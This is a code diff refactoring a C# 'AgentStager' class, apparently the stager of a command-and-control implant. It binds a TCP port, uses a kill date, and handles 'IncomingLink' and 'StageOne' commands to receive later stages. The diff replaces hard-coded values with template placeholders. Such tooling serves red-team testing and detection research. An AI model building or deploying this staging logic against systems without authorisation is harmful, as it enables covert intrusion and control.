@@ -8,10 +8,9 @@ class AgentStager
 
     static string AgentID;
 
-    static readonly string BindAddress = "127.0.0.1";
-    static readonly int BindPort = int.Parse("4444");
-
-    static DateTime KillDate = DateTime.Parse("25/09/2030 00:00:01");
+    static readonly string BindAddress = "<<BindAddress>";
+    static readonly int BindPort = int.Parse("<<BindPort>>");
+    static readonly DateTime KillDate = DateTime.Parse("<<KillDate>>");
 
     public AgentStager()
     {
@@ -31,17 +30,18 @@ class AgentStager
 
         try
         {
-            var commModule = new TcpCommModule(AgentID, BindAddress, BindPort);
+            var commModule = new TcpCommModule(BindAddress, BindPort);
+            commModule.SetMetadata(AgentID);
             commModule.Start(crypto);
-            
 
             while (StagerStatus == StagerStatus.Staging)
             {
-                if (commModule.RecvData(out AgentMessage message))
+                if (commModule.RecvData(out AgentMessage message) == true)
                 {
-                    if (message.Data.Command.Equals("IncomingLink", StringComparison.OrdinalIgnoreCase))
+                    if (message.Data != null && message.Data.Command.Equals("IncomingLink", StringComparison.OrdinalIgnoreCase))
                     {
-                        commModule.QueueStageRequest(Encoding.UTF8.GetString(message.Data.Data));
+                        commModule.SetParentID(Encoding.UTF8.GetString(message.Data.Data));
+                        commModule.QueueStageRequest();
                     }
                     else if (message.Data.Command.Equals("StageOne", StringComparison.OrdinalIgnoreCase))
                     {
